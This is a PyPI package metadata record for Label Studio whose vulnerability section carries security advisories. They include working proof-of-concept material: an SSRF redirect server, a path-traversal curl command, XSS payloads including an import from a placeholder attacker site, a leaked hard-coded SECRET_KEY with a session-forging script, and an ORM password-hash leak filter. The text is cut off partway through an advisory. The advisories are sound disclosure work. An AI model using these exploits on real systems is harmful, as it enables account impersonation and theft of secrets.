{"0.4.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.4.1/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.2.4)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (==4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","murmurhash (==1.0.2)","numpy (==1.17.4)","plac (==0.9.6)","preshed (==2.0.1)","python-dateutil (==2.8.1)","python-json-logger (==0.1.11)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (==2.1.3)","PyInquirer (==1.0.3)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"0.4.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"81e039a116f380ab06139440f63c657c568de01dd9bfc89270bf565df6fb1be8","md5":"5caa8365ef0bbbb59375e47dc6486fb0","sha256":"6f3c7929f72ceb5e2be9b128c0c868908dc3935b4281ab554333a8e11c3de976"},"downloads":-1,"filename":"label_studio-0.4.1-py3-none-any.whl","has_sig":false,"md5_digest":"5caa8365ef0bbbb59375e47dc6486fb0","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":6854379,"upload_time":"2020-01-10T21:55:07","upload_time_iso_8601":"2020-01-10T21:55:07.842393Z","url":"https://files.pythonhosted.org/packages/81/e0/39a116f380ab06139440f63c657c568de01dd9bfc89270bf565df6fb1be8/label_studio-0.4.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"b16411bca9acb97e286452ecaaa7a9832a6c1c0a20600a3a63c6dcffbcbcddcc","md5":"81c9c1c3c193774a76bb9c901338ef56","sha256":"86a5a7bbffd58ea1c34f8fae7c5ecfb5ff333b77578ebef4b9013e6b054d431f"},"downloads":-1,"filename":"label-studio-0.4.1.tar.gz","has_sig":false,"md5_digest":"81c9c1c3c193774a76bb9c901338ef56","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":6794091,"upload_time":"2020-01-10T21:55:28","upload_time_iso_8601":"2020-01-10T21:55:28.145716Z","url":"https://files.pythonhosted.org/packages/b1/64/11bca9acb97e286452ecaaa7a9832a6c1c0a20600a3a63c6dcffbcbcddcc/label-studio-0.4.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, 